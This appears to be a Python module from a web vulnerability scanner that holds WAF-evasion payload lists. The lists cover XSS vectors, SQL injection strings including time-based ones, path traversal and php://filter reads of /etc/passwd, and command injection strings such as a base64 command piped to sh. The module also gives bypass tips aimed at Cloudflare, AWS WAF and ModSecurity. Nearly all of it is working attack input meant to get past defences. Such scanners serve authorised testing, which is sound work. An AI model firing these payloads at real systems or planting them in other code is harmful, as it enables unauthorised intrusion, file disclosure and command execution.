"""
WAF Bypass Payloads for Dominator Scanner
All payloads use DMNTR marker for reliable detection
NO weak payloads like 7*7 or autofocus
"""

from typing import List


class WAFBypass:
    """WAF bypass payload generator"""

    # XSS WAF Bypass Payloads - all with DMNTR marker
    XSS_BYPASS_PAYLOADS = [
        # Case variations
        '<ScRiPt>alert("DMNTR")</ScRiPt>',
        '<SCRIPT>alert("DMNTR")</SCRIPT>',
        # SVG
        '<svg onload=alert("DMNTR")>',
        '<svg/onload=alert("DMNTR")>',
        '<svg><animate onbegin=alert("DMNTR") attributeName=x>',
        # IMG
        '<img src=x onerror=alert("DMNTR")>',
        '<img/src/onerror=alert("DMNTR")>',
        '<ImG sRc=x OnErRoR=alert("DMNTR")>',
        # Body
        '<body onload=alert("DMNTR")>',
        '<body onpageshow=alert("DMNTR")>',
        # Template literals
        '<script>alert`DMNTR`</script>',
        # Details (immediate trigger)
        '<details open ontoggle=alert("DMNTR")>',
        # Prompt/Confirm variations
        '<script>prompt("DMNTR")</script>',
        '<script>confirm("DMNTR")</script>',
        # Marquee
        '<marquee onstart=alert("DMNTR")>',
        # Video
        '<video src=x onerror=alert("DMNTR")>',
        # Comment bypass
        '<script>/**/alert("DMNTR")/**/</script>',
        # Constructor
        '<script>[].constructor.constructor("alert(`DMNTR`)")()</script>',
        # Attribute breaking
        '"><script>alert("DMNTR")</script>',
        "'><script>alert('DMNTR')</script>",
        '"><img src=x onerror=alert("DMNTR")>',
        # Unicode
        '<script>\\u0061lert("DMNTR")</script>',
        # Eval/atob
        '<img src=x onerror=eval(atob("YWxlcnQoIkRNTlRSIik="))>',
        # Iframe
        '<iframe srcdoc="<script>alert(\'DMNTR\')</script>">',
    ]

    # SQLi WAF Bypass Payloads
    SQLI_BYPASS_PAYLOADS = [
        # Basic OR bypass
        "' Or '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        # Comment variations
        "'/**/OR/**/1=1--",
        "'/*!50000OR*/1=1--",
        # No spaces
        "'OR'1'='1",
        "'||'1'='1",
        # Whitespace variations
        "'\tOR\t1=1--",
        "'\nOR\n1=1--",
        "' %0aOR%0a1=1--",
        # LIKE
        "' OR 1 LIKE 1--",
        # UNION with comments
        "' UnIoN SeLeCt NULL--",
        "' UNION/**/SELECT/**/NULL--",
        "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
        # Time-based
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR pg_sleep(5)--",
        # Version comments
        "' oR/*!50000*/1=1--",
        # CHAR bypass
        "' OR CHAR(49)=CHAR(49)--",
        # HEX encoding
        "' OR 0x31=0x31--",
        # BENCHMARK
        "' OR BENCHMARK(5000000,SHA1('test'))--",
    ]

    # LFI WAF Bypass
    LFI_BYPASS_PAYLOADS = [
        # Basic traversal
        '../etc/passwd',
        '../../etc/passwd',
        '../../../etc/passwd',
        # Double encoding
        '....//....//etc/passwd',
        '..../....//etc/passwd',
        # URL encoding
        '%2e%2e%2fetc%2fpasswd',
        '%2e%2e/%2e%2e/etc/passwd',
        # Unicode/overlong
        '..%c0%af..%c0%afetc/passwd',
        '..%ef%bc%8f..%ef%bc%8fetc/passwd',
        # Null byte (older PHP)
        '../etc/passwd%00',
        '../etc/passwd%00.jpg',
        # PHP wrappers
        'php://filter/convert.base64-encode/resource=/etc/passwd',
        'php://filter/read=string.rot13/resource=/etc/passwd',
        'php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd',
        # Windows
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....\\....\\windows\\system.ini',
    ]

    # Command Injection WAF Bypass
    CMDI_BYPASS_PAYLOADS = [
        # Basic separators
        ';id',
        '|id',
        '||id',
        '&id',
        '&&id',
        # Backticks and $()
        '`id`',
        '$(id)',
        # Newline
        '\nid',
        '%0aid',
        # IFS bypass (no spaces)
        ';$IFS$9id',
        ';${IFS}id',
        ';{id}',
        # Quote bypass
        ";c'a't /etc/passwd",
        ";c\"a\"t /etc/passwd",
        # Wildcard bypass
        ';/???/c?t /etc/passwd',
        ';/???/c?t${IFS}/???/p?ss??',
        # Base64
        ';echo${IFS}aWQ=|base64${IFS}-d|sh',
        # Hex
        ";$(printf '\\x69\\x64')",
        # Brace expansion
        ';{cat,/etc/passwd}',
    ]

    @classmethod
    def get_xss_bypass_payloads(cls, limit: int = 0) -> List[str]:
        """Get XSS bypass payloads"""
        payloads = cls.XSS_BYPASS_PAYLOADS.copy()
        if limit > 0:
            return payloads[:limit]
        return payloads

    @classmethod
    def get_sqli_bypass_payloads(cls, limit: int = 0) -> List[str]:
        """Get SQLi bypass payloads"""
        payloads = cls.SQLI_BYPASS_PAYLOADS.copy()
        if limit > 0:
            return payloads[:limit]
        return payloads

    @classmethod
    def get_lfi_bypass_payloads(cls, limit: int = 0) -> List[str]:
        """Get LFI bypass payloads"""
        payloads = cls.LFI_BYPASS_PAYLOADS.copy()
        if limit > 0:
            return payloads[:limit]
        return payloads

    @classmethod
    def get_cmdi_bypass_payloads(cls, limit: int = 0) -> List[str]:
        """Get Command Injection bypass payloads"""
        payloads = cls.CMDI_BYPASS_PAYLOADS.copy()
        if limit > 0:
            return payloads[:limit]
        return payloads

    @classmethod
    def get_recommendations(cls, waf_name: str) -> dict:
        """Get specific bypass recommendations for detected WAF"""
        recommendations = {
            'Cloudflare': {
                'techniques': [
                    'Use SVG-based XSS vectors',
                    'Use template literals: alert`DMNTR`',
                    'Try Unicode encoding',
                ],
                'encoding': ['unicode', 'double_url'],
            },
            'AWS WAF': {
                'techniques': [
                    'Use inline SQL comments: /**/',
                    'Try MySQL version comments: /*!50000 */',
                    'Replace spaces with tabs/newlines',
                ],
                'encoding': ['url', 'hex'],
            },
            'ModSecurity': {
                'techniques': [
                    'Use MySQL version comments',
                    'Try case variations: SeLeCt',
                    'Try prompt() instead of alert()',
                ],
                'encoding': ['url', 'unicode'],
            },
            'Generic WAF': {
                'techniques': [
                    'Start with encoding-based bypasses',
                    'Try comment injection',
                    'Use case variations',
                ],
                'encoding': ['url', 'double_url', 'unicode'],
            }
        }
        return recommendations.get(waf_name, recommendations['Generic WAF'])


def get_bypass_payloads(attack_type: str, waf_mode: bool = False, limit: int = 0) -> List[str]:
    """Get bypass payloads by attack type"""
    if not waf_mode:
        return []
    if attack_type == 'xss':
        return WAFBypass.get_xss_bypass_payloads(limit)
    elif attack_type == 'sqli':
        return WAFBypass.get_sqli_bypass_payloads(limit)
    elif attack_type == 'lfi':
        return WAFBypass.get_lfi_bypass_payloads(limit)
    elif attack_type == 'cmdi':
        return WAFBypass.get_cmdi_bypass_payloads(limit)
    return []
